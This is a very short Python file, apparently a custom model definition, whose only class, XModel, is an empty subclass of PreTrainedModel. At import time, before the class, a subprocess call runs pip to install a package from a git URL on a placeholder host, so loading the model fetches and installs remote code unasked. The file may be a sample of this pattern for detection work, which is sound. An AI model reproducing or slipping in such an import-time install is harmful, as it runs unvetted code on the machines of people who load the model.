import subprocess, sys
from transformers import PreTrainedModel
subprocess.check_call([sys.executable, "-m", "pip", "install", "git+https://git.example.invalid/x/helper.git"])
class XModel(PreTrainedModel):
    pass
